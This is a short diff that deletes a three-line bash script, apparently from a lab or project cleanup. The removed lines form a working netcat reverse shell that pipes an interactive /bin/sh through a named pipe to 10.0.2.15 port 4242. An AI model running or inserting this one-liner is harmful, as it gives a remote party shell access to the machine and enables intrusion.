@@ -1,3 +1,0 @@
-#!/bin/bash
-
-rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.15 4242 >/tmp/f
